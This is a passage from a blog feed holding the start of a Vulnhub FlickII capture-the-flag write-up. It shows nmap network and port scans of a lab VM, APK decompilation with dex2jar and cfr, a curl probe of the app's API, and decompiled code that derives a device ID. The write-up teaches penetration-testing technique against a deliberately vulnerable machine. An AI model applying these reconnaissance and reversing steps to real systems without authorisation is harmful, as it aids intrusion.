&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;sources&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Save, &lt;strong&gt;REBOOT&lt;/strong&gt;, and it will work.&lt;/p&gt;
&lt;p&gt;Thanks to
&lt;a href="http://codetitans.pl/blog/post/osmc--smb-share-with-credentials"&gt;http://codetitans.pl&lt;/a&gt;
for this last part.&lt;/p&gt;</content><category term="programming"></category><category term="osmc"></category><category term="raspberry"></category><category term="smb"></category><category term="programming"></category></entry><entry><title>Vulnhub - FlickII</title><link href="https://maggick.fr/2016/03/vulnhub-flickii.html" rel="alternate"></link><published>2016-03-13T20:43:00+01:00</published><updated>2016-03-13T20:43:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-03-13:/2016/03/vulnhub-flickii.html</id><summary type="html">&lt;p&gt;&lt;img alt="FlickII" class="align-left" src="/media/2016.03/flickii.png" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;Still playing with the vulnhub machines this time it is the turn of FlickII.
This one is different from the others as it has an android application
associated. It would be a great exercice to play with mobile application,
decompile it and see what is in the inside.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.03/flickii.png" alt="FlickII" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Still playing with the vulnhub machines this time it is the turn of FlickII.
This one is different from the others as it has an android application
associated. It would be a great exercice to play with mobile application,
decompile it and see what is in the inside.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#host-discovery"&gt;Host discovery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#apk-analysis"&gt;APK analysis&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#api-token-and-doregisteractivityjava"&gt;API token and DoRegisterActivity.java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#command-execution-and-commandactivityjava"&gt;Command execution and CommandActivity.java&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#shell-exploitation"&gt;Shell exploitation&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#reverse-shell"&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#batman-and-robin"&gt;Batman and Robin?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#where-is-bryan"&gt;Where is bryan?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sean"&gt;sean&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#root-me"&gt;root me?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id="host-discovery"&gt;Host discovery&lt;/h2&gt;
&lt;p&gt;Connecting to host-only network:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo ip addr add 192.168.56.1/24 dev vboxnet&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Scanning the network to find the virtual machine IP address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@rootine flick-check-dist&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.56.1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;7.01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CET&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.56.1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.00061&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.56.101&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.00097&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;done&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;addresses&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hosts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scanned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Scanning the virtual machine to find open ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@rootine flick-check-dist&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;65535&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.56.101&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;T4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;7.01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CET&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.56.101&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.00088&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;filtered&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;443&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;done&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scanned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;123.28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="apk-analysis"&gt;APK analysis&lt;/h2&gt;
&lt;p&gt;We got an apk. If we unzip it we got lots of xml files and a dex file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;Downloads&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flickII&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flick&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dist&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;AndroidManifest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;classes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dex&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;META&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="bp"&gt;INF&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;README&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;resources&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arsc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is a lot of tool in order to decompile and APK and get class files or jar
files like &lt;a href="http://siis.cse.psu.edu/dare/"&gt;dare&lt;/a&gt;,
&lt;a href="http://sourceforge.net/projects/dex2jar/"&gt;dex2jar&lt;/a&gt; and more (&lt;a href="http://shgck.io/docs/android/apk_decomp/"&gt;here is an article
about android decompiler comparison&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;I tried to use dare to convert dex file to Java bytecode but there was an issue
between my 64 bits Arch Linux system and the 32 bits executable. I didn't dig
this issue and just go for dex2jar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh d2j-dex2jar.sh flick-check-dist.apk&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;From there I use &lt;a href="http://www.benf.org/other/cfr/"&gt;cfr&lt;/a&gt; to decompile the jar file
to Java files and human readable code.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;java -jar cfr_0_110.jar flickII/flick-check-dist-dex2jar.jar --outputdir flickII/flick-check-dist-cfr-java/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the decompiled code. The interesting part of the application is the
com/flick/flickeck folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;├── com&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── flick&lt;/span&gt;
&lt;span class="code-line"&gt;│   │   └── flickcheck&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── BuildConfig.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── CallApi.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── CommandActivity.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── DoRegisterActivity.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── MainActivity.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── PubKeyManager.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── ReadApiServerActivity.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       ├── RegisterActivity.java&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       └── R.java&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We take a look at each file in this directory in order to understand the
application goal and how it works.&lt;/p&gt;
&lt;h3 id="api-token-and-doregisteractivityjava"&gt;API token and DoRegisterActivity.java&lt;/h3&gt;
&lt;p&gt;The file DoRegisterActivity.java show us how to register a new device. By
testing the URL presented in the file we got:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;error&amp;quot;:&amp;quot;This method is not allowed for the requested resource.&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We lack an ID to "authenticate" ourself. The line 70 to 75 show us how to get
this ID:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TelephonyManager&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getBaseContext&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSystemService&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDeviceId&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSimSerialNumber&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Secure&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ContentResolver&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSharedPreferences&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131099666&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_server&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
